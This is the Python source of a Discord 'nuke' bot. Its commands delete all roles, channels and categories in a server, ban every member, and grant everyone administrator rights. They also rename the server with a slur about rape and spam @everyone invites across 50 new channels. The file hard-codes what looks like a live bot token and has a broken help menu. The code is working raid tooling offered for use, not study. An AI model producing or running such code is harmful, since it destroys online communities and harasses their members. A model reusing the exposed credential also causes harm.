import discord
from discord.ext import commands
import requests
import os
import asyncio

intents = discord.Intents().all()
bot = commands.Bot(command_prefix=".", intents=intents)

@bot.event
async def on_ready():
    print(f"Bot is ready.")

@bot.command(aliases=['nuke', 'wizz'])
async def kill(ctx):

    # Change server's profile picture
    pfp_url = "https://cdn.discordapp.com/attachments/1190987632046506144/1192131706447208529/IMG_0987.png?ex=65a7f62b&is=6595812b&hm=23c37e7f11ffa881583937c0202f3a06f0c08a3c7154e1f0d5f3f34803c32dfd&"
    response = requests.get(pfp_url)
    pfp_bytes = response.content
    await ctx.guild.edit(icon=pfp_bytes)

    print(f"Nuking {ctx.guild.name} ({ctx.guild.id})...")
    await ctx.guild.edit(name="VG rapes")

    for role in ctx.guild.roles:
        try:
            await role.delete()
            print(f"Deleted role: @{role.name}")
        except discord.HTTPException as e:
            print(f"Error deleting role: @{role.name} [{e}]")

    tasks = []
    for channel in ctx.guild.channels:
        tasks.append(channel.delete())

    await asyncio.gather(*tasks)
    print(f"Deleted {len(tasks)} channels")

    try:
        tasks = []
        for i in range(50):
            tasks.append(ctx.guild.create_text_channel("VG OWNS US"))

        created_channels = await asyncio.gather(*tasks)

        for channel in created_channels:
            print(f"Created channel: #{channel.name}")

        async def send_messages(channel):
          for i in range(1, 31):
            await channel.send(f'@everyone @here join discord.gg/nukedxx .')

        message_tasks = []
        concurrency_level = 50 

        for i in range(0, len(created_channels), concurrency_level):
            batch = created_channels[i:i + concurrency_level]
            task = asyncio.gather(*[send_messages(channel) for channel in batch])
            message_tasks.append(task)

        await asyncio.gather(*message_tasks, return_exceptions=True)

    except Exception as e:
        print(f"Error: {e}")

@bot.command(aliases=['ban'])
async def banall(ctx):
    await ctx.message.delete()

    print(f"Banning all members in {ctx.guild.name} ({ctx.guild.id})...")

    tasks = [member.ban(reason="Server Nuke") for member in ctx.guild.members if member != ctx.message.author]
    await asyncio.gather(*tasks, return_exceptions=True)
    print("Ban process complete.")
@bot.command(aliases=['morechannels', 'makechannels'])
async def mc(ctx):
    for i in range(30):
        channel = await ctx.guild.create_text_channel(f'join us lmao')
        await channel.send(f'Join us. discord.gg/nukedxx')

@bot.command(aliases=['moreroles', 'makeroles'])
async def mr(ctx):
    guild = ctx.guild
    for i in range(40):
        role_name = f'VG RUNS '
        role = await guild.create_role(name=role_name)

@bot.command()
async def admin(ctx):
    guild = ctx.guild
    admin_role = await guild.create_role(name="Admin", permissions=discord.Permissions.all())
    await ctx.author.add_roles(admin_role)
    await ctx.send(f"Created the 'Admin' role and assigned it to {ctx.author.mention}")
@bot.command(aliases=['delroles', 'deleteroles', 'rolesvanish'])
async def dr(ctx):
    for role in ctx.guild.roles:
        if role != ctx.guild.default_role:
            await role.delete()
    await ctx.send('All roles have been deleted.')
@bot.command(aliases=['everyoneadmin'])
async def eadmin(ctx):
    everyone_role = ctx.guild.default_role
    await everyone_role.edit(permissions=discord.Permissions.all())
    await ctx.send(f"Assigned all admin permissions to {everyone_role}")
@bot.command(name='dca')
async def delete_all_categories(ctx):
    for category in ctx.guild.categories:
        await category.delete()
    await ctx.send('All categories have been deleted.')
@bot.command(name='dc')
async def delete_all_channels(ctx):
    for channel in ctx.guild.channels:
        await channel.delete()
    await ctx.send('All channels have been deleted.')
class HelpView(discord.ui.View):
    def __init__(self):
        super().__init__()

        self.add_item(discord.ui.Button(style=discord.ButtonStyle.primary, label='Premium Commands', custom_id='premium'))
        self.add_item(discord.ui.Button(style=discord.ButtonStyle.secondary, label='Free Commands', custom_id='free'))

@bot.command()
async def h(ctx):
    embed = discord.Embed(
        title='Help Menu',
        description='Choose a category:',
        color=discord.Color.blue()
    )

    view = HelpView()
    message = await ctx.send(embed=embed, view=view)

    def check(interaction):
        return (
        interaction.message.id == message.id 
        and interaction.user == ctx.author
        and interaction.custom_id in ['Prem Cmds.', 'Free Cmds.']
    )

    try:
        interaction = await ctx.bot.wait_for("button_click", check=check, timeout=60.0)

        if interaction.component.custom_id == 'Prem Cmds.':
            premium_embed = discord.Embed(
                title='Premium Commands',
                description='Soon...',
                color=discord.Color.gold()
            )
            await ctx.send(embed=premium_embed)

        elif interaction.component.custom_id == 'Free Cmds.':
            free_embed = discord.Embed()
            title='Free Commands',
            description='''kill - Fucks up the server
                mc - makes 30 more channels
                dc - deletes every channel
                mr - makes 40 roles
                dr - deletes all roles
                dca - deletes every category
                admin - gives you a admin role
                eadmin - gives @everyone admin permissions'''
            color=discord.Color.green()
            await ctx.send(embed=free_embed)

    except asyncio.TimeoutError:
        await ctx.send("You took too long to make a selection. Please try again.")
bot.remove_command(help)
token = "MTE4MjQyNjQ0MDM0ODc0NTc5OA.GCYDvK.NyuAdGLRDpzVbVq8ImGYnwlFD4aj6-tPJXh73Y"
bot.run(token)
